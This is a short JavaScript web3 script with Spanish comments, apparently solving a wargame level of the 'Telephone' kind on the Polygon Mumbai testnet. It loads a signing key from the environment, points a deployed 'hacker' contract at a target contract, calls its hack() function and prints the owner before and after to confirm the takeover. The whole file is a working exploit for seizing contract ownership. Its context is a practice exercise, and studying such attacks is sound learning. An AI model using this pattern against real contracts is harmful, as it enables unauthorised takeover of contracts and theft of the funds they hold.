ENV_NODE=require('dotenv').config();
const Web3 = require('web3');
const Provider = require('@truffle/hdwallet-provider');

const address = '0x601eaA885bF37D28906Ad58d7508cFa1Af10E754'; // la de mi billetera desde donde hice la instancia del contrato
const privateKey = ENV_NODE.parsed.privKey; // la clave privada de la billetera para poder firmar
const nodeUrl = `https://polygon-mumbai.g.alchemy.com/v2/${process.env.PROJECT_ID}`; // el nodo con que firmaré

const SCaddress_hacker = '0x0D230c0fe9f91c914937B84430009863CE67Ef8E';
const abi_hacker = [ { "inputs": [ { "internalType": "address", "name": "_addr", "type": "address" } ], "name": "changePhoneToHack", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "hack", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "telephoneToHack", "outputs": [ { "internalType": "address", "name": "", "type": "address" } ], "stateMutability": "view", "type": "function" } ];

const SCaddress = '0xa5b683990D3b60d6c5BDf3De5638c62096E61B54';
const abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xa6f9dae1"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"}];

const init3 = async () => {
    // creo provider con el nodo provisto y mi llave privada para poder hacer las firmas sin metamask
    const provider = await new Provider(privateKey, nodeUrl); 
    // genero la instancia web3
    const web3 = await new Web3(provider);
    // creo instancia del contrato para llamar a sus funciones
    const myContract = await new web3.eth.Contract(abi,SCaddress);
    const myHackerContract = await new web3.eth.Contract(abi_hacker,SCaddress_hacker);
  
    console.log(`Old Owner: ${await myContract.methods.owner().call()}`);
    await myHackerContract.methods.changePhoneToHack(SCaddress).send({ from: address });
    await myHackerContract.methods.hack().send({ from: address });
    console.log(`New Owner: ${await myContract.methods.owner().call()}`);

}
  
init3();